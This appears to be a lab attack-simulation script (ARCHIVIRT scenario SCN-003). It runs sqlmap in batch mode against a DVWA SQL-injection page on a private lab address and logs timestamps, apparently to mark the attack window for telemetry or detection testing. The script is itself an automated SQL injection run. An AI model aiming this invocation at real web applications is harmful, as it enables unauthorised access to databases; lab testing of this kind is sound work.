#!/bin/bash
# ARCHIVIRT campaign_v1 — SCN-003 SQL Injection (sqlmap). SINGLE SOURCE OF TRUTH.
# Runs ON the attacker (ansible -m script).
set -uo pipefail

URL="${ARCHIVIRT_SQLI_URL:-http://10.0.2.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit}"
ts() { date -u +%Y-%m-%dT%H:%M:%S.%NZ; }

echo "ARCHIVIRT_SCENARIO=SCN-003"

if ! command -v sqlmap >/dev/null 2>&1; then
    echo "ARCHIVIRT_PREREQUISITE_MISSING=sqlmap"
    exit 0
fi

echo "ARCHIVIRT_ATTACK_START=$(ts)"
sudo timeout 90 sqlmap -u "$URL" --batch --level=1 --risk=1 --technique=B
rc=$?
echo "ARCHIVIRT_ATTACK_END=$(ts)"
echo "ARCHIVIRT_ATTACK_RC=$rc"
